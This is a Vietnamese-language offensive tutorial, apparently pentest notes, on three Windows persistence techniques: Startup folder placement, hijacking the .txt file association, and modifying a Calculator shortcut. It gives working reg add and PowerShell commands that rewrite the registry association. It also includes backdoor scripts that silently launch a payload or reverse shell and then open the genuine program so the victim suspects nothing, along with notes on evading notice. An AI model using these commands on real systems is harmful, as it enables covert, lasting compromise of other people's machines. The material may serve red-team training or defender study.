**1. Persistence Through Startup Folder**
- Kỹ thuật này là một phương pháp duy trì quyền truy cập cổ điển trên hệ điều hành Windows. Adversary đặt một file thực thi (executable), shortcut (.lnk), script (.bat, .ps1, .vbs) hoặc bất kỳ file nào có khả năng thực thi vào các thư mục Startup của hệ thống. Khi người dùng đăng nhập (logon), Windows tự động thực thi tất cả các file nằm trong các thư mục này mà không cần tương tác thêm từ người dùng.
- Vị trí thư mục start up:
  + C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup: Áp dụng cho một user cụ thể.
  + C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup: system-wide, áp dụng cho mọi user đăng nhập.

**2. Hijack Default File Extension**
- Hijack Default File Extension là một kỹ thuật persistence trên Windows bằng cách chiếm quyền điều khiển file association (liên kết giữa phần mở rộng file và chương trình mở file đó. Kỹ thuật này cho phép kẻ tấn công thực thi mã độc mỗi khi người dùng mở một loại file cụ thể, ví dụ như .txt, .pdf, .docx,... hệ thống sẽ tự động thực thi payload độc hại thay vì (hoặc trước khi) mở chương trình hợp lệ bình thường.
- Windows lưu thông tin file association trong Registry tại: HKLM\Software\Classes\<ProgID>\shell\open\command. ví dụ: ProgID của .txt là txtfile
- Adversary sửa giá trị (Default) của key này để trỏ đến script/payload của mình. Ví dụ: Thay lệnh mở Notepad thành chạy PowerShell script độc hại, sau đó vẫn mở Notepad để tránh nghi ngờ.
→ Mỗi lần mở file .txt → payload chạy ngầm + file vẫn mở bình thường.
- Cách thực hiện:
1. Sinh payload, upload lên target
2. Tạo file script C:\windows\backdoor.ps1
```
# Chạy payload ngầm (không hiện cửa sổ)
Start-Process -WindowStyle Hidden -FilePath "C:\Windows\Temp\svchost.exe"

# Mở file .txt bình thường bằng Notepad để victim không nghi ngờ
Start-Process "C:\Windows\System32\notepad.exe" -ArgumentList $args[0]
```
- Hijack file association .txt:
  + cmd: reg add "HKLM\Software\Classes\txtfile\shell\open\command" /ve /t REG_SZ /d "powershell.exe -WindowStyle Hidden \"C:\Windows\backdoor.ps1\" %1" /f
  + Powershell: Set-ItemProperty -Path "HKLM:\Software\Classes\txtfile\shell\open\command" -Name "(Default)" -Value 'powershell.exe -WindowStyle Hidden "C:\Windows\backdoor.ps1" %1'
- Đây là kỹ thuật persistence tinh vi, hiệu quả cao trong môi trường Windows vì tận dụng hành vi mở file hàng ngày của victim và Khó phát hiện nếu payload mở lại ứng dụng hợp lệ sau khi chạy.

**3. Persistence Using ShortCut Modification**
- Kỹ thuật này duy trì quyền truy cập (persistence) bằng cách sửa đổi file shortcut (.lnk) thường dùng trên Windows. Thay vì shortcut trỏ trực tiếp đến chương trình hợp lệ, adversary thay đổi để chạy payload độc hại trước, sau đó vẫn mở chương trình gốc để người dùng không nhận ra sự khác biệt.
- Tôi sẽ thực hiện kỹ thuật này với shorcut của Calculator (calc.exe). Shortcut Calculator trên Desktop thường có Target: %SystemRoot%\system32\calc.exe
1. Tạo script C:\Windows\backdoor.ps1
```
# Chạy payload ngầm
Start-Process -NoNewWindow "C:\Windows\Temp\reverse_shell.exe"

# Sau đó mở Calculator thật để victim không nghi ngờ
Start-Process "C:\Windows\System32\calc.exe"
```
2. Sửa shortcut:
   + Right-click shortcut → Properties → Tab Shortcut.
   + Thay đổi trường Target thành: powershell.exe -WindowStyle Hidden "C:\Windows\backdoor.ps1"
   + Trong tab Shortcut → Change Icon → chọn lại icon từ C:\Windows\System32\calc.exe để icon không thay đổi
- Lúc này, Khi victim double-click shortcut Calculator:
  + Payload chạy ngầm → kết nối về attacker.
  + Calculator mở bình thường → victim không thấy gì bất thường.
- Shortcut Modification là kỹ thuật persistence đơn giản nhưng hiệu quả cao về mặt ngụy trang trực quan.
- Ưu điểm
+ Rất khó phát hiện trực quan: Icon, tên shortcut không đổi.
+ Trigger khi victim click shortcut quen thuộc (Calculator, Notepad, Chrome, v.v.).
+ Không cần quyền admin nếu shortcut nằm trong thư mục user (Desktop, Start Menu cá nhân).
- Nhược điểm
+ Chỉ hiệu quả với những shortcut mà victim hay dùng.
+ Dễ bị phát hiện nếu kiểm tra Properties của shortcut.
